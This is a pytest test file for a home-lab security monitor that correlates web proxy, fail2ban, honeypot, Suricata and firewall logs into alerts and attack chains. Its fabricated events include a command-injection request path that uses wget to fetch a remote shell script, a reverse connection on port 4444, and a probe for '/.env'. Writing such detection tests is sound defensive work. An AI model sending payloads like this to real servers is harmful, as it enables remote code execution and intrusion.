"""Cross-source rules: SWAG / CrowdSec / fail2ban / honeypot tied to OPNsense firewall and Unraid containers."""
import asyncio
import os
from datetime import datetime, timedelta, timezone

import pytest

from lookingglass import db
from lookingglass.config import Settings
from lookingglass.crosslink import container_matches, ports
from lookingglass.detections import DetectionEngine, raise_alert
from lookingglass.parsers.common import event

DSN = os.environ.get("TEST_DATABASE_URL")
NOW = datetime.now(timezone.utc)
ATTACKER, SCANNER, CDN = "203.0.113.66", "198.51.100.7", "192.0.2.80"


def ev(source, minutes=1, **kw):
    return event(NOW - timedelta(minutes=minutes), source, severity=5, **kw)


def web(ip, minutes, path, status, tags, domain="nextcloud.example.com", **data):
    return ev("nginx", minutes, program="swag", action=f"http_{status}", src_ip=ip, domain=domain,
              data={"path": path, "status": status, "tags": tags, **data})


def test_helpers():
    assert ports("80, 443;8443,x,70000") == [80, 443, 8443]
    assert container_matches("nextcloud", "nextcloud.example.com")
    assert container_matches("home-assistant", "homeassistant.example.com")
    assert container_matches("vault", "pw.vault.example.com")
    assert not container_matches("plex", "nextcloud.example.com") and not container_matches("x", None)


async def alerts(pool, rule):
    return [dict(r) for r in await pool.fetch(
        "SELECT title, severity, host(src_ip) ip, host(dst_ip) dst, description, data FROM alerts WHERE rule = $1 "
        "ORDER BY id", rule)]


@pytest.mark.skipif(not DSN, reason="TEST_DATABASE_URL not set")
def test_cross_source_rules():
    async def main():
        await db.connect(DSN)
        try:
            pool = db.pool()
            await pool.execute("TRUNCATE events, alerts, devices, blocks")
            await pool.execute("DELETE FROM kv WHERE key LIKE 'wm:%'")
            evs = [
                # an RCE attempt on SWAG that got a 200, then the server opens a connection back to the attacker
                web(ATTACKER, 30, "/index.php?cmd=wget+http://x/sh", 200, ["rce"]),
                ev("firewall", 20, action="pass", src_ip="192.168.1.10", dst_ip=ATTACKER, dst_port=4444, direction="out"),
                # a scanner touched the honeypot; a device inside contacted it BEFORE that: not a call home
                ev("firewall", 50, action="pass", src_ip="192.168.1.11", dst_ip=SCANNER, dst_port=443),
                web(SCANNER, 40, "/wp-login.php", 404, ["honeypot"], honeypot="true"),
                ev("fail2ban", 39, action="ban", src_ip=SCANNER, data={"jail": "nginx-badbots"}),
                # ... and afterwards the firewall still lets it in on SSH (forwarded) and on 443 (the proxy itself)
                ev("firewall", 10, action="pass", src_ip=SCANNER, dst_ip="192.168.1.10", dst_port=22, direction="in"),
                ev("firewall", 10, action="pass", src_ip=SCANNER, dst_ip="192.168.1.10", dst_port=443, direction="in"),
                # a CDN address that "attacks" (requests forwarded for others) and that many devices use
                web(CDN, 30, "/.env", 200, ["sensitive_file"], x_forwarded_for="1.2.3.4"),
            ] + [ev("firewall", 5, action="pass", src_ip=f"192.168.1.{30 + i}", dst_ip=CDN, dst_port=443) for i in range(4)]
            # the attacker also triggered Suricata on OPNsense
            evs.append(ev("suricata", 35, action="alert", src_ip=ATTACKER, message="ET EXPLOIT x", data={"priority": 1}))
            await db.copy_events(evs)
            await db.kv_set("wm:proxy_callback", 0)
            await db.kv_set("wm:ban_bypass", 0)
            await db.kv_set("wm:web_attacks", 0)
            eng = DetectionEngine(Settings(internal_networks="192.168.0.0/16"))
            await eng.proxy_callbacks()
            await eng.ban_bypass()

            cb = await alerts(pool, "proxy_callback")
            assert [(a["ip"], a["dst"]) for a in cb] == [("192.168.1.10", ATTACKER)]  # not the scanner, not the CDN
            assert cb[0]["severity"] == "critical" and "web attack (rce)" in cb[0]["description"]
            bp = await alerts(pool, "ban_bypass")
            assert [a["ip"] for a in bp] == [SCANNER] and "port 22)" in bp[0]["title"]  # 443 is SWAG itself
            assert "fail2ban ban (nginx-badbots)" in bp[0]["description"] and "honeypot" in bp[0]["description"]
            # blocked on OPNsense already: no second alert
            await pool.execute("TRUNCATE alerts")
            await pool.execute("INSERT INTO blocks (ip, status, reason) VALUES ($1::inet, 'active', 't')", SCANNER)
            await db.kv_set("wm:ban_bypass", 0)
            await eng.ban_bypass()
            assert not await alerts(pool, "ban_bypass")

            # the web attack alert says OPNsense saw the address too, and is rated a step higher for it
            await eng.web_attacks()
            wa = [a for a in await alerts(pool, "web_attack") if a["ip"] == ATTACKER]
            assert wa and wa[0]["severity"] == "high" and "OPNsense side flagged this address too" in wa[0]["description"]

            # the container behind the attacked site starts crashing right after
            await raise_alert("unraid_container_restarting", "medium", "Tower: container nextcloud keeps restarting",
                              "unraid_restart:x:nextcloud", data={"container": "nextcloud"})
            await raise_alert("unraid_container_restarting", "medium", "Tower: container plex keeps restarting",
                              "unraid_restart:x:plex", data={"container": "plex"})
            await eng.web_container_trouble()
            ct = await alerts(pool, "web_container_trouble")
            assert [(a["ip"], a["data"]["container"]) for a in ct] == [(ATTACKER, "nextcloud")]
            assert ct[0]["severity"] == "high"

            # web attack (Attack) + container trouble (Impact) from one internet address = an attack chain
            await eng.attack_chains()
            chain = {a["ip"]: a for a in await alerts(pool, "attack_chain")}
            assert ATTACKER in chain and chain[ATTACKER]["data"]["stages"][-1] == "Impact"
            await pool.execute("TRUNCATE events, alerts, devices, blocks")
        finally:
            await db.close()

    asyncio.run(main())
